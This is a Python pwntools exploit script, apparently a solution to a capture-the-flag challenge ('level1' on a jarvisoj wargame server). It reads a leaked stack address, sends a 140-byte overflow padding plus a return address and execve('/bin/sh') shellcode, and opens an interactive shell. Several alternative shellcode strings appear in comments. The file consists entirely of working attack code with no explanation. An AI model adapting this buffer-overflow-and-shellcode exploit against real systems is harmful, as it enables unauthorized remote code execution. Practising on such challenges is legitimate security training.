#!/usr/bin/env python
# -*- encoding: utf-8 -*-
__author__ = 'Albertchang'
from pwn import *
#context.log_level = "debug"
DEBUG = 0
LOCAL = 0
if LOCAL == 1:
        p = process('./level1.80eacdcd51aca92af7749d96efad7fb5')
else:
        p = remote('127.0.0.1',6666)
        p = remote('pwn2.jarvisoj.com',9877)
ret = 0xffffd600  #获取ret地址即可替换
shellcode = "\xeb\x10\x48\x31\xc0\x5f\x48\x31\xf6\x48\x31\xd2\x48\x83\xc0\x3b\x0f\x05\xe8\xeb\xff\xff\xff\x2f\x62\x69\x6e\x2f\x2f\x73\x68"
shellcode = asm(shellcraft.i386.linux.sh(), arch = 'i386')
#shellcode = "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
#shellcode = "\x6a\x0b\x58\x31\xf6\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\xcd\x80"
#print shellcode
recv_tmp = p.recvline()
recv_addr = int(recv_tmp[recv_tmp.find(':')+1:-2],16)
print type(recv_addr)
print p32(recv_addr)
payload = 'A' * 140 +  p32(recv_addr+144) + shellcode
if DEBUG == 1:
        context.terminal = ['gnome-terminal', '-x', 'zsh', '-c']
        gdb.attach(proc.pidof(p)[0])
p.send(payload)
p.interactive()
